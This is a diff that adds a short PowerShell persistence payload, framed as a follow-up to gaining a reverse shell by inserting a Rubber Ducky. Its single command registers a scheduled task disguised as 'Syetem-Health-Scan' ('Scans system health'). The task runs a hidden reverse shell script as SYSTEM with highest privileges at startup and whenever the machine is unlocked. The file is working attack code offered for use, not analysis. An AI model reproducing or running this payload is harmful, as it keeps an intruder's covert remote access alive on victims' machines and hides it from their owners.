@@ -1,0 +1,10 @@
+# ----------------------------
+# PowerShell Scheduled Task Payload for Persistence
+# Description: Creates a scheduled task that runs a reverse shell script (L.ps1)
+# silently at system startup and whenever the machine is unlocked.
+# Runs as SYSTEM with highest privileges.
+# Run these following commands on the Reverse Shell that you gained by inserting the Rubber Ducky.
+# ----------------------------
+
+#Run this single line command on the reverse shell.
+$action = New-ScheduledTaskAction -Execute 'Powershell.exe' -Argument '-NoProfile -WindowStyle Hidden -command "C:\Windows\System32\L.ps1"';$startupTrigger = New-ScheduledTaskTrigger -AtStartup;$stateChangeTriggerClass = Get-CimClass -Namespace ROOT\Microsoft\Windows\TaskScheduler -ClassName MSFT_TaskSessionStateChangeTrigger;$onUnlockTrigger = New-CimInstance -CimClass $stateChangeTriggerClass -Property @{ StateChange = 8 } -ClientOnly;$trigger = @($startupTrigger, $onUnlockTrigger);$principal = New-ScheduledTaskPrincipal -RunLevel Highest -UserID "NT AUTHORITY\SYSTEM";$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable;Register-ScheduledTask -Action $action -Trigger $trigger -Principal $principal -TaskName "Syetem-Health-Scan" -Description "Scans system health" -Settings $settings
